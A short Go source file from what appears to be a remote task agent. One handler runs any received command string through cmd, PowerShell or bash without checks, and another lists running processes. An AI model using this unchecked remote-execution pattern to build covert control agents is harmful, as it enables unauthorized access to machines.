package main

import (
	"runtime"
)

// taskExecCmd 执行命令，与 agent.py task_exec_cmd 对齐
// 参数: command, shell(cmd/powershell/bash)
func taskExecCmd(d map[string]interface{}) string {
	cmd := tdGetString(d, "command", "")
	if cmd == "" {
		return "[ERROR] empty command"
	}
	shell := tdGetString(d, "shell", "cmd")
	return runShellCmd(cmd, shell, 60)
}

// taskProcessList 列出进程
// 注意: tasklist /v 在进程数多时极慢（可能超时），改用 tasklist 不带 /v
func taskProcessList(d map[string]interface{}) string {
	if runtime.GOOS == "windows" {
		return runShellCmd("tasklist", "cmd", 15)
	}
	return runShellCmd("ps aux", "bash", 15)
}
